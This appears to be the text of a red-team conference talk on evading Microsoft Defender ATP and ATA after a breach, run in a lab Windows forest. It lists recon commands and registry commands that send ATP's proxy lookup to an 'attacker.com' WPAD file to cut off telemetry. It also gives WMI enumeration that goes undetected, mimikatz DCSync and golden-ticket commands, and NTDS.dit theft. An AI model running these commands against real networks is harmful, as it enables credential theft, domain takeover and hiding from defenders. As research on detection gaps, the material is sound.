01 
02 
03 
MS Just Gave the Blue Team 
Tactical Nukes  
(And How Red Teams Need To Adapt) 
 2
 IBM Security 
Who is this Drew Carey Look Alike On Stage? 
•  Red Team Ops Lead at IBM X-Force Red 
•  I conduct red teaming operations against defense 
contractors and some of North America’s largest banks  
•  On the board for CREST USA (crest-approved.org) 
•  I teach network and mobile pentesting 
•  I like mountain biking, drones, and beer 
•  It’s my first time, be gentle 
•  Canadian, sorry not sorry 
 3
 IBM Security 
Lab Background 
•  3 domains within 2012R2 Forest & 2016 Forest, connected via 2-way Forest Trust 
•  3000~ users 
•  ATP RS2 running on 10x Windows 10 1703 boxes with all ATP default and preview features enabled 
•  10x 2012R2/2016 member servers running SQL 2012, etc. 
•  Both forests have an ATA 1.8 Lightweight Gateway running 1.7 since March, upgraded to 1.8 early 
July 
 4
 IBM Security 
Tactical nukes? wut? 
Red Team^
 Blue Team^ 
 5
 IBM Security 
We’re Talking Post Breach 
Source: https://blogs.microsoft.com/microsoftsecure/2016/11/28/disrupting-the-kill-chain/  
 6
 IBM Security 
ATP’s Cloud-Based Management Dashboard Intro 
 7
 IBM Security 
Alert Process Tree 
 8
 IBM Security 
Incident Graphs 
 9
 IBM Security 
Host Management 
 10
 IBM Security 
Upcoming Windows 10 Fall Creators Update w/ ATP Release 3 
Defender “brand” expanded to include: 
•  Windows Defender AV 
•  Windows Defender Advanced Threat Protection  
•  Windows Defender Exploit Guard (EMET)  
•  Windows Defender Application Guard  
•  Windows Defender Device Guard  
•  Credential Guard  
•  Extended to cover the Windows Server platform, starting with Windows Server 2012 R2 and 2016, 
Linux 
Source: https://blogs.windows.com/business/2017/06/27/announcing-end-end-security-features-windows-10/  
 11
 IBM Security 
 12
 IBM Security 
Gaining a Foothold w/ Out Of The Box Payloads 
 13
 IBM Security 
Obfuscated Payloads 
 14
 IBM Security 
Oh right, they talked about PSv5 security last year... 
•  “Suspicious Strings” are already flagged in PSv5 by default 
•  PowerShell v5 has Script Block Logging on by default.  
•  AMSI is also enabled by default... 
•  You can’t just downgrade to PSv2 to bypass 
•  Same goes for using NotPowerShell or those that directly call System.Management.Automation.dll 
•  Common techniques leveraging WScript.Shell, etc. are also caught. 
 15
 IBM Security 
Undetected: 
•  Bypassing Script Block Logging/AMSI and then executing encoded 
payloads  
•  Using VBA shellcode injection and not using Kernel32 API declarations 
(such as @vysecurity’s cactustorch)  
•  And sneakier executables with Shelter, diagcabs, etc. 
https://www.mdsec.co.uk/2017/07/payload-generation-with-cactustorch/  
https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html  
https://github.com/nccgroup/winpayloads 
 16
 IBM Security 
Remember, we’re talking POST Breach 
•  The challenge doesn’t stop by getting on the box undetected initially... that’s the 
easy part. 
•  The problem is detection of activities performed/tools and commands run after 
you have an initial foothold / C&C: 
̶  Host Recon  
̶  Host Priv Esc  
̶  Internal Domain Recon  
̶  Internal Network Recon  
̶  Stealing Creds  
̶  Lateral Movement  
̶  Grabbing the NTDS.Dit 
 17
 IBM Security 
Host Recon 
echo %userdomain% 
echo %logonserver% 
echo %homepath% 
echo %homedrive% 
net view 
net view \fileserv /all  
net share 
net accounts 
netstat 
tasklist /svc 
gpresult /z 
net localgroup Administrators 
netsh advfirewall show allprofiles state 
systeminfo 
netstat –anfo 
wmic process list brief 
wmic group list brief 
wmic computersystem list  
wmic process list /format:list   
wmic ntdomain list /format:list   
wmic useraccount list /format:list   
wmic group list /format:list   
wmic sysaccount list /format:list 
$env:USERDOMAIN 
$env:LOGONSERVER 
$env:HOMEPATH 
$env:HOMEDRIVE 
$env:SYSTEMDRIVE 
$env:TEMP 
$env:ComSpec 
$env:USERNAME 
Tree $home   
 18
 IBM Security 
Side note: Traditional Defender AV also runs as Local System 
By the time you read these tweets over your 
morning coffee, your target’s Defender AV 
instances were already patched... 
 19
 IBM Security 
Must elevate to system to stop ATP process, service, modify binaries, 
etc. 
 20
 IBM Security 
Uninstalling 
•  Unlike other cloud AV products like CrowdStrike R TM, you can’t just uninstall them from an elevated 
command prompt such as: 
  wmic product where "description='CrowdStrike Sensor Platform’” uninstall 
•  ATP requires a generated offboarding script with a SHA256 signed reg key based on the unique Org ID 
and cert to uninstall: 
 21
 IBM Security 
•  The ATP sensor uses Windows Telemetry (DiagTrack service), which in turn uses WinHTTP Services 
(winhttp.dll.mui) to report sensor data and communicate with the Windows Defender ATP cloud 
service.  
Telemetry (Cloud Comms) 
 22
 IBM Security 
Disrupt ATP Comms as an Unprivileged User 
• 
The WinHTTP API is independent of Windows Internet (WinINet) internet browsing proxy settings, however it will follow 
statically set proxy settings within HKCU via the function WinHttpGetProxyForUrl 
• 
As unprivileged user, you can also manually configure this (no restart required) at: 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" ^ /v 
 AutoDetect /t REG_DWORD /D 0 /f 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v 
 AutoConfigURL /t REG_SZ /d "http://attacker.com/wpad.dat" /f 
• 
Note this only blocks ATP (Sense), not Windows Defender AV,  
as AV doesn’t use WinHTTP 
 23
 IBM Security 
Block ATP Comms via FW 
You can use the same technique to block traffic for Event Log Forwarding, 
Sysmon, SCOM, etc. 
 24
 IBM Security 
Why Block Instead Of Disabling? 
•  Very quick... 
•  Doesn’t require escalating to system 
•  Doesn’t alert on communication error within 
Security Centre/cloud ATP console for 7 days 
•  Initial IR shows the service/process still 
running 
•  This issue isn't unique to ATP... 
 25
 IBM Security 
ATA 
•  ATA Center  
•  ATA Gateway 
•  ATA Lightweight Gateway 
•  ATA needs the following 
Windows events: 4776, 4732, 
4733, 4728, 4729, 4756, 4757 
•  Can integrate with SIEM (syslog) 
& VPN (Radius) 
 26
 IBM Security 
Learning Period 
1 month of learning: 
•  Abnormal behavior 
•  Abnormal sensitive group modification 
•  Recon using directory services 
1 week of learning: 
•  Encryption downgrades (skeleton key, golden ticket, over pass the hash) 
•  Brute force 
 27
 IBM Security 
Detected: Internal Recon Activities 
Detected: AD recon via typical queries like “net user /domain” 
Detected: DNS queries and zone transfers 
Detected: User session enumeration via PowerView, NetSess, etc. 
 28
 IBM Security 
Not Detected: Enumeration via WMI Local Name Space 
Domain User Accounts: 
Get-WmiObject -Class Win32_UserAccount -Filter "Domain='dev' AND Disabled='False'" | 
Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired, 
PasswordChangeable, Description, SID 
Domain Groups: 
Get-WmiObject -Class Win32_GroupInDomain | Select PartComponent | Select-String -Pattern 
"Microsoft Advanced Threat Analytics“ 
Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name like '%SQL%'" 
Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name like '%Admin%’” 
Domain Group User Memberships: 
Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name='Enterprise 
Admins'" | Get-CimAssociatedInstance -Association Win32_GroupUser 
Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name='DNSAdmins'" | 
Get-CimAssociatedInstance -Association Win32_GroupUser 
Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name='Microsoft 
Advanced Threat Analytics Administrator'" | Get-CimAssociatedInstance -Association 
Win32_GroupUser 
 29
 IBM Security 
Examples 
 30
 IBM Security 
Forest Trusts 
Demo 
 31
 IBM Security 
Lateral Movement via SQL 
Demo 
 32
 IBM Security 
Detected: DCSync 
mimikatz # lsadump::dcsync /domain prod.local /user:krbtgt 
 33
 IBM Security 
Copying NTDS.dit File Remotely using the WMI 
Win32_ShadowCopy Class 
•  Using a technique by @0xbadjuju, we can use the WMI Win32_ShadowCopy Class to dump the 
ntds.dit via volume shadow copies without having to call vssadmin.exe 
•  Copying the NTDS.dit and SYSTEM files from a workstation isn’t detected by ATP 
•  But is flagged only as a LOW severity event in ATA due to execution: 
 34
 IBM Security 
Detected: Golden Tickets Detection (Using KRBTGT NTLM Hash) 
kerberos::golden /user:EdwardAbbey /domain:prod.local /
sid:S-1-5-21-2184559304-2325842030-2845129662-500 /krbtgt:
43f53b1c3516a08b2c33ded83bff0c9f /groups:513,512,520,518,519 /ptt 
 35
 IBM Security 
Not Detected: Using AES Key 
kerberos::golden /user:JohnVanwagoner /domain:prod.local /
sid:S-1-5-21-2184559304-2325842030-2845129662 /
aes256:05df6ed1616d67dc672d51814959b9b6de0d9f5f89c53d186eff3cea13bae2e9 /
groups:512,513 /startoffset:-1 /endin:500 /renewmax:3000 /ptt 
DEMO 
 36
 IBM Security 
Big Thanks / Sources 
•  @angus_tx, @nosteve, and the rest of the IBM X-Force Red crew 
•  @0xbadjuju, @_nullbind, NetSPI for PowerUp SQL and WMI techniques 
•  @mattifestation and the rest of the ATP/ATA crew at MS 
•  @cobbr_io, @danielhbohannon, @nikhil_mitt, @kevin_Robertson, @gentilkiwi, @armitagehacker, 
@harmj0y, @JershMagersh, @vysecurity, and many others for tools, techniques, and giving back to 
the community